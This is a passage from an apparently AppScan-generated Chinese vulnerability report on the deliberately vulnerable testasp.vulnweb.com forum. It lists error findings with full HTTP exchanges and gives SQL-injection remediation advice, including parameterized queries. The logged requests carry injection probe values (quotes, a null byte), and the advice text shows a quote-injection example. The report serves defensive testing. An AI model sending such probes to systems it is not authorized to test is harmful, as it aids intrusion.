    &lt;td colspan="2"&gt;&lt;div class="menubar"&gt;&lt;a href="Templatize.asp?item=html/about.html" class="menu"&gt;about&lt;/a&gt; - &lt;a href="Default.asp" class="menu"&gt;forums&lt;/a&gt; - &lt;a href="Search.asp" class="menu"&gt;search&lt;/a&gt; 
     - &lt;a href="./Login.asp?RetURL=%2FDefault%2Easp%3F" class="menu"&gt;login&lt;/a&gt; - &lt;a href="./Register.asp?RetURL=%2FDefault%2Easp%3F" class="menu"&gt;register&lt;/a&gt; 
	- &lt;a href="https://www.acunetix.com/vulnerability-scanner/sql-injection/" class="menu"&gt;SQL scanner&lt;/a&gt; - &lt;a href="https://www.acunetix.com/websitesecurity/sql-injection/" class="menu"&gt;SQL vuln help&lt;/a&gt;
    &lt;/div&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;!-- InstanceBeginEditable name="MainContentLeft" --&gt;
	&lt;table width="100%" border="0" cellspacing="0" cellpadding="5"&gt;
      &lt;tr&gt;
        &lt;td class="tableheader"&gt;Forum&lt;/td&gt;
        &lt;td class="tableheader"&gt;Threads&lt;/td&gt;
        &lt;td class="tableheader"&gt;Posts&lt;/td&gt;
        &lt;td class="tableheader"&gt;Last Post&lt;/td&gt;
      &lt;/tr&gt;   
	&lt;tr bgcolor='#FFFFFF'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=0'&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;Talk about Acunetix Web Vulnerablity Scanner&lt;/div&gt;&lt;/td&gt;&lt;td&gt;35&lt;/td&gt;&lt;td&gt;35&lt;/td&gt;&lt;td&gt;1/13/2025 6:27:08 AM&lt;/td&gt;&lt;/tr&gt;&lt;tr bgcolor='#e9ffe9'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=1'&gt;Weather&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;What weather is in your town right now&lt;/div&gt;&lt;/td&gt;&lt;td&gt;9&lt;/td&gt;&lt;td&gt;9&lt;/td&gt;&lt;td&gt;1/13/2025 6:21:00 AM&lt;/td&gt;&lt;/tr&gt;&lt;tr bgcolor='#FFFFFF'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=2'&gt;Miscellaneous&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;Anything crossing your mind can be posted here&lt;/div&gt;&lt;/td&gt;&lt;td&gt;47&lt;/td&gt;&lt;td&gt;47&lt;/td&gt;&lt;td&gt;1/13/2025 4:25:17 AM&lt;/td&gt;&lt;/tr&gt;
	&lt;/table&gt;&lt;!-- InstanceEndEditable --&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr align="right" bgcolor="#FFFFFF"&gt; 
    &lt;td colspan="2" class="footer"&gt;Copyright 2019 Acunetix Ltd.&lt;/td&gt; 
  &lt;/tr&gt; 
&lt;/table&gt; 
&lt;div style="background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px"&gt;
	&lt;p style="padding-left:20%;padding-right:20%"&gt;&lt;b&gt;Warning&lt;/b&gt;: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.&lt;/p&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;!-- InstanceEnd --&gt;&lt;/html&gt;
</div></div>
				 
				
				<input type="hidden" name="sectionstart" xmlns="" />
				 
				
			<div id="attUndefinedState" class="issueType" xmlns=""><div class="severity severity_0">參</div><div><h2 class="nowordwrap"><a href="#attUndefinedState">應用程式錯誤</a>
					 
					<span class="count">3</span><a name="attUndefinedState"></a></h2></div><div class="toclink"><a class="toclink" href="#toc">目錄</a></div></div><div class="h3group" xmlns=""><h3>問題
						 
						1
						 
						/
						 
						3</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attUndefinedState">應用程式錯誤</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_0">參考資訊</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">0.0</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N" target="_blank">AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/Search.asp">http://testasp.vulnweb.com/Search.asp</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">tfSearch (Parameter)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能收集機密性除錯資訊</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>未對送入的參數值執行適當的範圍檢查</li><li>未執行驗證，以確定使用者輸入符合預期的資料類型</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attUndefinedState_Adv">請驗證參數值是在預期的範圍內且為預期的類型。請勿輸出除錯錯誤訊息和異常狀況</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">應用程式已回應錯誤訊息，指出有未定義的狀態可能會顯現機密性資訊。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET /Search.asp?<span class="mark">tfSearch=\'</span> HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Referer: http://testasp.vulnweb.com/Search.asp
Connection: keep-alive
Cookie: ASPSESSIONIDQQQQQDST=IJNPCCMBHKLHBPMFKKCEMKNK
Content-Length: 0


HTTP/1.1 <span class="highlight">500</span> Internal Server Error
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:35:06 GMT
Content-Length: 1208

&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/&gt;
&lt;title&gt;500 - Internal server error.&lt;/title&gt;
&lt;style type="text/css"&gt;
&lt;!--
body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
fieldset{padding:0 15px 10px 15px;} 
h1{font-size:2.4em;margin:0;color:#FFF;}
h2{font-size:1.7em;margin:0;color:#CC0000;} 
h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 
#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
background-color:#555555;}
#content{margin:0 0 0 2%;position:relative;}
.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
--&gt;
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div id="header"&gt;&lt;h1&gt;Server Error&lt;/h1&gt;&lt;/div&gt;
&lt;div id="content"&gt;
 &lt;div class="content-container"&gt;&lt;fieldset&gt;
  &lt;h2&gt;500 - Internal server error.&lt;/h2&gt;
  &lt;h3&gt;There is a problem with the resource you are looking for, and it cannot be displayed.&lt;/h3&gt;
 &lt;/fieldset&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</div></div><div class="h3group" xmlns=""><h3>問題
						 
						2
						 
						/
						 
						3</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attUndefinedState">應用程式錯誤</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_0">參考資訊</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">0.0</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N" target="_blank">AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/Templatize.asp">http://testasp.vulnweb.com/Templatize.asp</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">item (Parameter)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能收集機密性除錯資訊</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>未對送入的參數值執行適當的範圍檢查</li><li>未執行驗證，以確定使用者輸入符合預期的資料類型</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attUndefinedState_Adv">請驗證參數值是在預期的範圍內且為預期的類型。請勿輸出除錯錯誤訊息和異常狀況</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">應用程式已回應錯誤訊息，指出有未定義的狀態可能會顯現機密性資訊。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET /Templatize.asp?<span class="mark">item=%00</span> HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Referer: http://testasp.vulnweb.com/
Connection: keep-alive
Cookie: ASPSESSIONIDQQQQQDST=DOHPCCMBIHPPLOKMAEABPKDG
Content-Length: 0


HTTP/1.1 <span class="highlight">500</span> Internal Server Error
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:35:06 GMT
Content-Length: 1208

&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/&gt;
&lt;title&gt;500 - Internal server error.&lt;/title&gt;
&lt;style type="text/css"&gt;
&lt;!--
body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
fieldset{padding:0 15px 10px 15px;} 
h1{font-size:2.4em;margin:0;color:#FFF;}
h2{font-size:1.7em;margin:0;color:#CC0000;} 
h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 
#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
background-color:#555555;}
#content{margin:0 0 0 2%;position:relative;}
.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
--&gt;
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div id="header"&gt;&lt;h1&gt;Server Error&lt;/h1&gt;&lt;/div&gt;
&lt;div id="content"&gt;
 &lt;div class="content-container"&gt;&lt;fieldset&gt;
  &lt;h2&gt;500 - Internal server error.&lt;/h2&gt;
  &lt;h3&gt;There is a problem with the resource you are looking for, and it cannot be displayed.&lt;/h3&gt;
 &lt;/fieldset&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</div></div><div class="h3group" xmlns=""><h3>問題
						 
						3
						 
						/
						 
						3</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attUndefinedState">應用程式錯誤</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_0">參考資訊</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">0.0</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N" target="_blank">AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/showthread.asp">http://testasp.vulnweb.com/showthread.asp</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">id (Parameter)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能收集機密性除錯資訊</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>未對送入的參數值執行適當的範圍檢查</li><li>未執行驗證，以確定使用者輸入符合預期的資料類型</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attUndefinedState_Adv">請驗證參數值是在預期的範圍內且為預期的類型。請勿輸出除錯錯誤訊息和異常狀況</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">應用程式已回應錯誤訊息，指出有未定義的狀態可能會顯現機密性資訊。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET /showthread.asp?<span class="mark">id=%27</span> HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Referer: http://testasp.vulnweb.com/showforum.asp?id=0
Connection: keep-alive
Cookie: ASPSESSIONIDQQQQQDST=KJAADCMBDOAHLOHGBDMAGNIB
Content-Length: 0


HTTP/1.1 <span class="highlight">500</span> Internal Server Error
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:35:06 GMT
Content-Length: 1208

&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/&gt;
&lt;title&gt;500 - Internal server error.&lt;/title&gt;
&lt;style type="text/css"&gt;
&lt;!--
body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
fieldset{padding:0 15px 10px 15px;} 
h1{font-size:2.4em;margin:0;color:#FFF;}
h2{font-size:1.7em;margin:0;color:#CC0000;} 
h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 
#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
background-color:#555555;}
#content{margin:0 0 0 2%;position:relative;}
.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
--&gt;
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div id="header"&gt;&lt;h1&gt;Server Error&lt;/h1&gt;&lt;/div&gt;
&lt;div id="content"&gt;
 &lt;div class="content-container"&gt;&lt;fieldset&gt;
  &lt;h2&gt;500 - Internal server error.&lt;/h2&gt;
  &lt;h3&gt;There is a problem with the resource you are looking for, and it cannot be displayed.&lt;/h3&gt;
 &lt;/fieldset&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</div></div><div id="attReferrerPolicyHeaderExist" class="issueType" xmlns=""><div class="severity severity_0">參</div><div><h2 class="nowordwrap"><a href="#attReferrerPolicyHeaderExist">遺漏「查閱者原則」安全標頭</a>
					 
					<span class="count">1</span><a name="attReferrerPolicyHeaderExist"></a></h2></div><div class="toclink"><a class="toclink" href="#toc">目錄</a></div></div><div class="h3group" xmlns=""><h3>問題
						 
						1
						 
						/
						 
						1</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attReferrerPolicyHeaderExist">遺漏「查閱者原則」安全標頭</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_0">參考資訊</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">0.0</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N/E:X/RL:O/RC:C" target="_blank">AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N/E:X/RL:O/RC:C/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/">http://testasp.vulnweb.com/</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">testasp.vulnweb.com (Page)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能收集 Web 應用程式相關的機密性資訊，如：使用者名稱、密碼、機器名稱及/或機密檔案位置</li><li>有可能說服無經驗而易受騙的使用者提供機密性資訊，如：使用者名稱、密碼、信用卡號碼、社會保險號碼等等</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>不安全的 Web 應用程式設計或配置</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attReferrerPolicyHeaderExist_Adv">配置您的伺服器，以搭配安全原則使用「查閱者原則」標頭</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">AppScan 偵測到查閱者原則回應標頭遺漏或包含不安全的原則，這會增加各種跨網站注入攻擊的暴露風險</div></div><div class="name">測試要求和回應：</div><div class="code test">GET / HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Connection: keep-alive
Content-Length: 0


HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:23:17 GMT
Content-Length: 3561
Set-Cookie: ASPSESSIONIDSQRQRDTS=GINCJHPAIGHENGIPCLJFHOGA; path=/


&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
&lt;html&gt;&lt;!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" --&gt;
&lt;head&gt;
&lt;!-- InstanceBeginEditable name="doctitle" --&gt;
&lt;title&gt;acuforum forums&lt;/title&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"&gt;
&lt;!-- InstanceBeginEditable name="head" --&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;link href="styles.css" rel="stylesheet" type="text/css"&gt;
&lt;/head&gt;
&lt;body&gt; 
&lt;table width="100%"  border="0" cellpadding="10" cellspacing="0"&gt; 
  &lt;tr bgcolor="#008F00"&gt; 
    &lt;td width="306px"&gt;&lt;a href="https://www.acunetix.com/"&gt;&lt;img src="Images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td align="right" valign="middle" bgcolor="#008F00" class="disclaimer"&gt;TEST and Demonstration site for &lt;a href="https://www.acunetix.com/vulnerability-scanner/"&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;div class="menubar"&gt;&lt;a href="Templatize.asp?item=html/about.html" class="menu"&gt;about&lt;/a&gt; - &lt;a href="Default.asp" class="menu"&gt;forums&lt;/a&gt; - &lt;a href="Search.asp" class="menu"&gt;search&lt;/a&gt; 
     - &lt;a href="./Login.asp?RetURL=%2FDefault%2Easp%3F" class="menu"&gt;login&lt;/a&gt; - &lt;a href="./Register.asp?RetURL=%2FDefault%2Easp%3F" class="menu"&gt;register&lt;/a&gt; 
	- &lt;a href="https://www.acunetix.com/vulnerability-scanner/sql-injection/" class="menu"&gt;SQL scanner&lt;/a&gt; - &lt;a href="https://www.acunetix.com/websitesecurity/sql-injection/" class="menu"&gt;SQL vuln help&lt;/a&gt;
    &lt;/div&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;!-- InstanceBeginEditable name="MainContentLeft" --&gt;
	&lt;table width="100%" border="0" cellspacing="0" cellpadding="5"&gt;
      &lt;tr&gt;
        &lt;td class="tableheader"&gt;Forum&lt;/td&gt;
        &lt;td class="tableheader"&gt;Threads&lt;/td&gt;
        &lt;td class="tableheader"&gt;Posts&lt;/td&gt;
        &lt;td class="tableheader"&gt;Last Post&lt;/td&gt;
      &lt;/tr&gt;   
	&lt;tr bgcolor='#FFFFFF'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=0'&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;Talk about Acunetix Web Vulnerablity Scanner&lt;/div&gt;&lt;/td&gt;&lt;td&gt;35&lt;/td&gt;&lt;td&gt;35&lt;/td&gt;&lt;td&gt;1/13/2025 6:27:08 AM&lt;/td&gt;&lt;/tr&gt;&lt;tr bgcolor='#e9ffe9'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=1'&gt;Weather&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;What weather is in your town right now&lt;/div&gt;&lt;/td&gt;&lt;td&gt;9&lt;/td&gt;&lt;td&gt;9&lt;/td&gt;&lt;td&gt;1/13/2025 6:21:00 AM&lt;/td&gt;&lt;/tr&gt;&lt;tr bgcolor='#FFFFFF'&gt;&lt;td&gt;&lt;div class='forumtitle'&gt;&lt;a href='showforum.asp?id=2'&gt;Miscellaneous&lt;/a&gt;&lt;/div&gt;&lt;div class='forumdescription'&gt;Anything crossing your mind can be posted here&lt;/div&gt;&lt;/td&gt;&lt;td&gt;47&lt;/td&gt;&lt;td&gt;47&lt;/td&gt;&lt;td&gt;1/13/2025 4:25:17 AM&lt;/td&gt;&lt;/tr&gt;
	&lt;/table&gt;&lt;!-- InstanceEndEditable --&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr align="right" bgcolor="#FFFFFF"&gt; 
    &lt;td colspan="2" class="footer"&gt;Copyright 2019 Acunetix Ltd.&lt;/td&gt; 
  &lt;/tr&gt; 
&lt;/table&gt; 
&lt;div style="background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px"&gt;
	&lt;p style="padding-left:20%;padding-right:20%"&gt;&lt;b&gt;Warning&lt;/b&gt;: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.&lt;/p&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;!-- InstanceEnd --&gt;&lt;/html&gt;
</div></div>
             
            
            <input type="hidden" name="sectionstart" />
             
            
            <h1 id="howToFix"><a name="howToFix"></a>如何修正</h1><div class="h2group" id="attBlindSqlInjectionADNSMSSQL" xmlns=""><h2>MsSQL 盲目 SQL 注入（頻外）</h2><a name="attBlindSqlInjectionADNSMSSQL_Adv"></a><a class="toclink" href="#toc">目錄</a></div><div class="noPageBreak" xmlns=""><h4>原因：</h4><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><li>未正確地消毒使用者所輸入的危險字元</li></ul></div><div class="noPageBreak" xmlns=""><h4>風險：</h4><ul style="padding-left: 1.2em; margin-top:0"><div>有可能檢視、修改或刪除資料庫項目和表格</div><div>此軟體會使用受到外部影響的輸入，來建構全部或部分的 SQL 指令，但無法在傳送到資料庫時，讓可以修改 SQL 指令的元素失效。</div><div></div><div>當使用者可控制的輸入中，沒有足夠的移除或引用 SQL 語法時，產生的 SQL 查詢可能導致系統將這些輸入解譯為 SQL，而非一般使用者資料。這可用於變更查詢邏輯以略過安全性檢查，或插入其他可修改後端資料庫的陳述式，可能包含執行系統指令。</div><div></div><div>舉例來說，我們有一個包含登入表單的 HTML 頁面，最後會採用使用者輸入，在資料庫上執行下列 SQL 查詢：</div><div>  SELECT * FROM accounts WHERE username='$user' AND password='$pass'
</div><div>$user 和 $pass 這兩個變數包含使用者在登入表單中所輸入的使用者憑證。</div><div>如果使用者輸入「jsmith」作為使用者名稱，並且將「Demo1234」作為密碼，SQL 查詢看起來會像這樣：</div><div>  SELECT * FROM accounts WHERE username='jsmith' AND password='Demo1234'
</div><div>但如果使用者輸入「'」（單引號）作為使用者名稱和密碼，SQL 查詢看起來會像這樣：</div><div>  SELECT * FROM accounts WHERE username=''' AND password='''
</div><div>這當然就是型態異常的 SQL 查詢，這會呼叫錯誤訊息（可能在 HTTP 回應中傳回）。</div><div>這類錯誤會告知攻擊者 SQL 已成功注入，導致攻擊者嘗試進一步的攻擊向量。</div><div></div><div>盲目 SQL 注入與 SQL 注入相似，其差別在於攻擊者如要利用盲目 SQL，不需要在回應中查詢 SQL 錯誤。因此 AppScan 用於識別的方法也不一樣。</div><div></div><div>AppScan 不會嘗試呼叫 SQL 錯誤，但會找出容易遭受 SQL 注入的參數。</div><div>AppScan 可透過讓 SQL 伺服器本身執行我們可識別的外部要求，來執行這個動作。</div><div>這項技術需要傳送弱點參數（在 SQL 查詢中嵌入的參數）已經過修改的要求，以便外部要求表示資料是否在 SQL 查詢的脈絡中使用。每個 SQL 伺服器的修改都是獨一無二的。</div><div>頻外盲目 SQL 注入背後的概念是，即使攻擊者沒有直接從資料庫中收到資料，也能夠收到資料庫的內容（透過錯誤訊息或遭洩漏資訊的形式）。</div></ul></div><div class="noPageBreak" xmlns=""><h4>受影響的產品：</h4><ul style="&#xA;							list-style: none; padding-left: 0; margin-top:0;&#xA;						"><div>這個問題可能會影響不同類型的產品。</div></ul></div><div class="noPageBreak" xmlns=""><h4>修正建議：</h4><h5>一般</h5><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><div>以下是幾種減輕風險的技巧：</div><div>[1] 策略：程式庫或架構</div><div>使用檢查過且不容許此弱點的程式庫或架構，或提供使其更容易避免的建構項。</div><div></div><div>[2] 策略：參數化</div><div>如果可行，請使用結構化機制來自動強制分開資料與程式碼。這些機制可能可以自動提供相關的引用、編碼和驗證，而不是在每次產生輸出時，都依賴開發人員來提供。</div><div></div><div>[3] 策略：環境強化 使用完成必要作業所需的最低專用權，來執行程式碼。</div><div></div><div>[4] 策略：輸出編碼</div><div>如果儘管有風險，您還是需要使用動態產生的查詢字串或指令，適當地括住引數且避免在這些引數內使用任何特殊字元。</div><div></div><div>[5] 策略：輸入驗證</div><div>假設所有輸入都是惡意的。請使用「接受已知良好」輸入驗證策略：嚴格符合規格的可接受輸入白名單。拒絕未嚴格符合規格的任何輸入，或將其轉換成嚴格符合規格者。請勿只靠使用黑名單來偵測惡意或形態異常的輸入。不過，在偵測潛在攻擊或判斷哪些輸入因形態異常而應該斷然拒絕時，黑名單就很有用。</div><div>以下是保護 Web 應用程式免於遭受 SQL 注入攻擊的兩種可能方式：</div><div></div><div>[1] 使用儲存程序，而不用動態建置的 SQL 查詢字串。</div><div>參數傳給 SQL Server 儲存程序的方式，會防止使用單引號和連字號。</div><div></div><div>如何在 ASP.NET 中使用儲存程序的範例如下：</div><div></div><div>  ' Visual Basic example
  Dim DS As DataSet
  Dim MyConnection As SqlConnection
  Dim MyCommand As SqlDataAdapter
  
  Dim SelectCommand As String = "select * from users where username = @username"
  ...
  MyCommand.SelectCommand.Parameters.Add(New SqlParameter("@username", SqlDbType.NVarChar, 20))
  MyCommand.SelectCommand.Parameters("@username").Value = UserNameField.Value
  
  
  // C# example
  String selectCmd = "select * from Authors where state = @username";
  SqlConnection myConnection = new SqlConnection("server=...");
